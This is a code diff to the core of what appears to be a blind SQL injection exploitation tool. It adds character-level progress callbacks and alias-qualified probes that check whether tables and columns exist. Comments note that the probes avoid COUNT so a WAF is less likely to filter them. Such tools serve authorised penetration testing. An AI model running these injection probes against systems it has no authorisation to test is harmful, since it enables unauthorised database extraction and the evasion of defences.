@@ -29,9 +29,22 @@ class _OracleCore(object):
             self._probing = prev
 
     def _emit(self, value):
-        if self._progress and value not in (None, ""):
+        # per-VALUE feedback is for user-requested data reads only, NOT capability/discovery probes
+        # (charset, lazy hexfn, cast canary - all wrapped in _probePhase): surfacing an internal
+        # probe value as "retrieved: <x>" reads as a stray, out-of-context line to the user.
+        if self._progress and value not in (None, "") and not self._probing:
             try:
                 self._progress(value)
+            except Exception:
+                pass
+
+    def _emitChar(self, partial, total):
+        # live per-character feedback DURING a long extraction, so the user sees movement
+        # instead of a frozen prompt (a whole framed row is one long silent read otherwise) -
+        # suppressed during probe phases (see _emit) so a discovery probe doesn't animate
+        if self._charProgress and not self._probing:
+            try:
+                self._charProgress(partial, total)
             except Exception:
                 pass
 
@@ -109,11 +122,15 @@ class _OracleCore(object):
         return self._ask("1=1") and not self._ask("1=2") and \
                self._ask("'a'='a'") and not self._ask("'a'='b'")
 
-    def _exists(self, source, column="1"):
+    def _exists(self, source, column="1", alias=None):
         # does `source` (a table/catalog) - and optionally `column` in it - resolve?
         # WITHOUT COUNT (which a WAF may filter): a scalar subquery over it is NULL when
         # it resolves (WHERE 1=0 -> 0 rows) and ERRORS -> False when it doesn't. Works
         # for empty tables too. `column` is passed BARE so a nonexistent one errors,
         # rather than being taken as a string literal (SQLite quirk) and passing every
-        # fake name.
+        # fake name. When `alias` is set the column is ALIAS-QUALIFIED (`e.col`) so a bare
+        # candidate can't silently resolve to a KEYWORD/FUNCTION (USER, CURRENT_USER, ...)
+        # or an unrelated in-scope name - an alias-qualified unknown is always an error.
+        if alias:
+            return self._ask("(SELECT %s.%s FROM %s %s WHERE 1=0) IS NULL" % (alias, column, source, alias))
         return self._ask("(SELECT %s FROM %s WHERE 1=0) IS NULL" % (column, source))
